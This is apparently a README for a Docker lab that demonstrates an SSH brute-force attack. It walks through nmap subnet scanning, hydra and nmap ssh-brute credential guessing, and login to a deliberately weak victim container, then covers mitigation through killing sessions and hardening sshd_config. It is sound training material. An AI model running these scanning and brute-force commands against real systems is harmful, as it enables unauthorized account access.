![image](https://user-images.githubusercontent.com/71447362/135357401-27b285be-6f46-4b09-b898-2b139e7dba21.png)

# Brute Force Attack on SSH server
This is a demo to showcase a Brute Force attack using Docker containers.

This scenario is provided in the context of SPIDER Task 7.2 PUC1.

The tools used are Nmap, Hydra and OpenSSH.

## Scenario Structure
```
.
├── docker-compose.yaml
├── Dockerfile
├── launcher.sh
├── passwords.txt
├── README.md
└── users.txt
```
**docker-compose.yaml:** the compose version of the scenario

**Dockerfile:** custom image blueprint for the malicious container; it also links the set of credentials to be tested to the image

**launcher.sh:** an automatic attack launch script (runs on host machine - will be updated and potentially moved inside the attacker container for ease of use and stability)

**passwords.txt:** list of passwords to use for the brute-force attack

**users.txt:** list of usernames to use for the brute-force attack

**README.md:** the file you are reading now

To automatically run the brute force scenario via **docker-compose** run `launcher.sh`:
```
cd spider-puc1/Brute-Force/
sudo ./launcher.sh
```
In case the launcher.sh script returns an error, that is because hydra installation has not yet been completed in the attacking container. Please attach your terminal to the attacker and mancually launch the attack. Steps are seen below.

# Setup
The setup is comprised of two containers, a malicious and a victim one, interfacing within a bridge network.
Container IP addresses are known and set at the compose yaml file.

The users.txt file contains various possible usernames for the attacker to test; similarly, the passwords.txt file contains possible paswords to give access to the vulnerable machine.

The victim container's IP address is set to: 10.5.0.2

The malicious container's IP address is set to: 10.5.0.3

## Default SSH password 
During set up of the vulnerable container, the default user/password configuration is `test:test`.
You can change it either at the compose file, or by using `echo new-user:new-pass | chpasswd` at the victim Ubuntu container. 
As a reminder, you can attach your terminal to a desired container by using `docker exec -it <container_ID> bash`, where `<container_ID>` can be obtained by running `docker ps`.
Do not forget to add both the SSH username and password to the respective txt dictionaries as well (passwords.txt and users.txt).

## Multiple Login attempt (Method 1)
The attacker container (custom Kali image instance) can use a predefined set of login details to brute force the victim (ubuntu running vulnerable OpenSSH service).
After attaching the terminal to the malicious container, we can use the Hydra tool to perform brute force attacks using predefined datasets.

### Step 0 (you can skip if you used launcher.sh)
Build the provided Dockerfile to create the malicious container image:

`sudo docker build -t groot .`

... and then run the compose yaml file:

`sudo docker-compose up -d`

### Step 1
Get the malicious container ID:

`MALICIOUS_CONTAINER_ID=$(sudo docker ps -aqf "name=malicious_container")`

... and then run 'bash' in the container:

`sudo docker exec -it $MALICIOUS_CONTAINER_ID bash`

On the malicious container, perform an nmap to find open ports in the whole network range (replace arguments in `< >` with your own desired values):

`nmap <network_ip>/<subnetmask> -p 22 --open`

In our case:

`nmap 10.5.0.0/24 -p 22 --open`

### Step 2
On the malicious container, run hydra with your parameters (replace arguments in `< >` with your own desired values):

`hydra -L <usernames_file.txt> -P <passwords_file.txt> ssh://<nmap_vulnerable_ip> -t 4`

In our case:

`hydra -L users.txt -P passwords.txt ssh://10.5.0.2 -t 4`

Note the username and password outputed by hydra.

### Step 3
Connect to the victim container via ssh using the credentials you noted in the previous step:

`ssh <username>@10.5.0.2`

In our case:

`ssh test@10.5.0.2`

And proceed to use the password to gain access to the vulnerable machine.

## Multiple Login attempt (Method 2)
This method is pretty much identical to the first one, only it does not use Hydra and relies on Nmap's scripting functionality.

### Step 1
Get the malicious container ID:

`MALICIOUS_CONTAINER_ID=$(sudo docker ps -aqf "name=malicious_container")`

... and then run 'bash' in the container:

`sudo docker exec -it $MALICIOUS_CONTAINER_ID bash`

On the malicious container, run a scripted nmap to find open ports in the whole network range and attack the vulnerable one at once (replace arguments in `< >` with your own desired values):

`nmap <network_ip>/<subnetmask> -p 22 --script ssh-brute --script-args userdb=<usernames_file.txt>,passdb=<passwords_file.txt>`

In our case:

`nmap 10.5.0.0/24 -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt>`

## Attack Mitigation

### Step 1
Get the victim container ID:

`VICTIM_CONTAINER_ID=$(sudo docker ps -aqf "name=victim_container")`

... and then run 'bash' in the container:

`sudo docker exec -it $VICTIM_CONTAINER_ID bash`


### Step 2
See active SSH sessions:

`who`

The output will look like this:
```
root@1790c246f030:/# who
test     pts/0        Sep 26 16:35 (10.5.0.3)
```
The 'test' user with the 10.5.0.3 IP is the intruder.

### Step 3
Identify intruder's IP and get the process ID (PID) of the users ssh connection:

`ps aux | grep sshd`

The outpur will look like this:
```
...
test        4746  0.0  0.0  13904  5312 ?        S    16:35   0:00 sshd: test@pts/0
...
```

Next, from the above output, locate the specific process of the target users ssh connection and target that with kill -9:

`kill -9 <PID>`

In our case:

`kill -9 4746`

Another broader approach is to kill all processes belonging to a specific user account with pkill, this allows you to simply target a user account rather than a process ID:

`pkill -u username`

The effect of both commands is instant and the intruder will see a message at their terminal screen stating: 
```
test@1790c246f030:~$ Connection to 10.5.0.2 closed by remote host.
Connection to 10.5.0.2 closed.
```

### Step 4
Now that the intruder has been blocked from their current ssh session, change the password using:

`echo <username>:<safer-password> | chpasswd`

Note that `<username>` reflects the username which the attacker compromised, in our case `test`. 

### Step 5 (optional)
Rate-limit requests.

Fix the ssh config file.

Open up a text editor on the host in `/etc/ssh/sshd_config`.

`nano /etc/ssh/sshd_config`

(The following output is purely indicative)
```
# ... other settings

PermitRootLogin no
# obviously, you should modify the next 2 lines
AllowUsers bob alice
AllowGroups devs admins
MaxAuthTries 2
PermitEmptyPasswords no
PasswordAuthentication no
ChallengeResponseAuthentication no
# Disable unless using Kerberos / GSSAPI, enable if you need these services
GSSAPIAuthentication no
KerberosAuthentication no

# ... other settings, cont.
```

Change `MaxAuthTries` and `PermitRootLogin`.
